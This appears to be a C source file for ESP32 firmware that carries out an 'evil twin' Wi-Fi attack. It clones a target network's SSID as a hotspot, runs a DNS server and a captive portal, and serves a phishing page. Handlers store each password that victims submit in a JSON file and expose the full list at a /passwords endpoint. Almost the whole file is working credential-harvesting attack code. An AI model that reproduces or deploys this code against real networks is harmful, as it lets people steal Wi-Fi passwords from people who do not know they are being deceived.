// Copyright (c) 2025 HIGH CODE LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include "evil_twin.h"
#include "dns_server.h"
#include "esp_err.h"
#include "esp_log.h"
#include "http_server_service.h"
#include "storage_write.h"
#include "storage_read.h"
#include "storage_impl.h"
#include "storage_assets.h"
#include "cJSON.h"
#include "wifi_service.h"
#include <stdlib.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"

static const char *TAG = "EVIL_TWIN_BACKEND";

#define PATH_HTML_INDEX "html/captive_portal/evil_twin_index.html"
#define PATH_HTML_THANKS "html/captive_portal/evil_twin_thank_you.html"
#define PATH_PASSWORDS_JSON "storage/captive_portal/passwords.json"

static SemaphoreHandle_t storage_mutex = NULL;
static const char *current_template_path = PATH_HTML_INDEX;
static bool has_password = false;
static char last_password[64];

static void init_storage_mutex();


static esp_err_t submit_post_handler(httpd_req_t *req) {
  char buf[256];
  int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
  if (ret <= 0) return ESP_FAIL;
  buf[ret] = '\0';

  char password[64] = {0};
  if (http_service_query_key_value(buf, "password", password, sizeof(password)) == ESP_OK) {
    strncpy(last_password, password, sizeof(last_password) - 1);
    last_password[sizeof(last_password) - 1] = '\0';
    has_password = true;

    if (xSemaphoreTake(storage_mutex, pdMS_TO_TICKS(5000)) == pdTRUE) {
      cJSON *root_array = NULL;
      
      size_t size = 0;
      char *existing_json = (char*)storage_assets_load_file(PATH_PASSWORDS_JSON, &size);

      if (existing_json) {
        root_array = cJSON_Parse(existing_json);
        free(existing_json);
      }

      if (root_array == NULL) {
        root_array = cJSON_CreateArray();
      }

      cJSON *entry = cJSON_CreateObject();
      cJSON_AddStringToObject(entry, "user", "");
      cJSON_AddStringToObject(entry, "password", password);
      cJSON_AddStringToObject(entry, "2fa", "");
      cJSON_AddStringToObject(entry, "token", "");
      cJSON_AddItemToArray(root_array, entry);

      char *output = cJSON_PrintUnformatted(root_array);
      if (output) {
        // Write to absolute path
        char write_path[128];
        snprintf(write_path, sizeof(write_path), "/assets/%s", PATH_PASSWORDS_JSON);
        storage_write_string(write_path, output);
        free(output);
      }
      cJSON_Delete(root_array);

      xSemaphoreGive(storage_mutex); 
      ESP_LOGI(TAG, "Password successfully saved to JSON");
    } else {
      ESP_LOGE(TAG, "Timeout when attempting to obtain Mutex to save password");
    }
  }

  size_t size = 0;
  char *thanks = (char*)storage_assets_load_file(PATH_HTML_THANKS, &size);
  if (thanks) {
    http_service_send_response(req, thanks, HTTPD_RESP_USE_STRLEN);
    free(thanks);
  } else {
    http_service_send_error(req, HTTP_STATUS_NOT_FOUND_404, "Thank you HTML not found");
    return ESP_FAIL;
  }

  return ESP_OK;
}

static void init_storage_mutex() {
  if (storage_mutex == NULL) {
    storage_mutex = xSemaphoreCreateMutex();
  }
}

static esp_err_t passwords_get_handler(httpd_req_t *req) {
  init_storage_mutex();

  if (xSemaphoreTake(storage_mutex, pdMS_TO_TICKS(2000)) == pdTRUE) {
    size_t size = 0;
    char *json_data = (char*)storage_assets_load_file(PATH_PASSWORDS_JSON, &size);
    xSemaphoreGive(storage_mutex);

    if (json_data) {
      httpd_resp_set_type(req, "application/json");
      http_service_send_response(req, json_data, HTTPD_RESP_USE_STRLEN);
      free(json_data);
      return ESP_OK;
    }
  }

  http_service_send_response(req, "[]", HTTPD_RESP_USE_STRLEN); // Returns empty array if no file exists
  return ESP_OK;
}

static esp_err_t captive_portal_get_handler(httpd_req_t *req) {
  size_t size = 0;
  const char *path = current_template_path ? current_template_path : PATH_HTML_INDEX;
  char *html = (char*)storage_assets_load_file(path, &size);
  if (html) {
    http_service_send_response(req, html, HTTPD_RESP_USE_STRLEN);
    free(html);
    return ESP_OK;
  }
  http_service_send_error(req, HTTP_STATUS_NOT_FOUND_404, "Portal HTML not found");
  return ESP_FAIL;
}


// THIS FUNCTION SAVE PASSWORDS IN RAM
// static esp_err_t save_captured_password(const char *password) {
//     if (password_count >= MAX_PASSWORDS) {
//         ESP_LOGW(TAG, "Lista de senhas cheia! Ignorando: %s", password);
//         return ESP_FAIL;
//     }
//
//     strncpy(captured_passwords[password_count], password, MAX_PASSWORD_LEN);
//     captured_passwords[password_count][MAX_PASSWORD_LEN - 1] = '\0';
//
//     password_count++;
//     ESP_LOGI(TAG, "Senha capturada e salva [%d]: %s", password_count, password);
//
//     return ESP_OK;
// }

static void register_evil_twin_handlers(void) {
  start_web_server();
  httpd_uri_t submit_uri = {.uri = "/submit", .method = HTTP_POST, .handler = submit_post_handler};
  http_service_register_uri(&submit_uri);

  httpd_uri_t passwords_uri = {.uri = "/passwords", .method = HTTP_GET, .handler = passwords_get_handler};
  http_service_register_uri(&passwords_uri);

  httpd_uri_t root_uri = {.uri = "/", .method = HTTP_GET, .handler = captive_portal_get_handler};
  http_service_register_uri(&root_uri);

  httpd_uri_t captive_portal_uri = {
    .uri = "/hotspot-detect.html",
    .method = HTTP_GET,
    .handler = captive_portal_get_handler,
    .user_ctx = NULL};
  http_service_register_uri(&captive_portal_uri);
}

void evil_twin_start_attack(const char *ssid) {
  evil_twin_start_attack_with_template(ssid, PATH_HTML_INDEX);
}

void evil_twin_start_attack_with_template(const char *ssid, const char *template_path) {
  init_storage_mutex();
  ESP_LOGI(TAG, "Starting Evil Twin: %s", ssid);

  if (!storage_assets_is_mounted()) {
    storage_assets_init();
  }

  current_template_path = (template_path && template_path[0] != '\0') ? template_path : PATH_HTML_INDEX;
  has_password = false;
  last_password[0] = '\0';

  wifi_change_to_hotspot(ssid);
  start_dns_server();
  vTaskDelay(pdMS_TO_TICKS(1000));

  register_evil_twin_handlers();
  ESP_LOGI(TAG, "Attack active and Mutex ready.");
}

void evil_twin_stop_attack(void) {
  stop_http_server();
  stop_dns_server();
  // wifi_service_init(); // Restores standard Wi-Fi mode
  if (storage_mutex != NULL) {
    vSemaphoreDelete(storage_mutex);
    storage_mutex = NULL; 
  }
  ESP_LOGI(TAG, "Evil Twin logic stopped.");
}

void evil_twin_reset_capture(void) {
  has_password = false;
  last_password[0] = '\0';
}

bool evil_twin_has_password(void) {
  return has_password;
}

void evil_twin_get_last_password(char *out, size_t len) {
  if (!out || len == 0) return;
  strncpy(out, last_password, len - 1);
  out[len - 1] = '\0';
}
